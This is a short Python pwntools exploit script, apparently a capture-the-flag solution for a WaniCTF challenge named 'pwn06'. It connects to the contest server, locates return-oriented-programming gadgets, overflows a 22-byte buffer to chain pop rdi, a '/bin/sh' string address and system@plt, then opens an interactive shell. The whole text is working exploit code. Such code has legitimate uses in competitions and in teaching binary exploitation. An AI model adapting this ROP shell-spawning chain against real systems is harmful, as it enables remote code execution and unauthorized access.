from pwn import *

elf = ELF('./pwn06')
io = remote("rop.wanictf.org", 9006)
#io = process(elf.path)
rop = ROP(elf)

system_plt = elf.plt['system']
binsh = elf.symbols['binsh']
pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]
ret = (rop.find_gadget(['ret']))[0]

base = b'A' * 22
print(io.recvline())
payload = base + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system_plt)
io.sendline(payload)

io.interactive()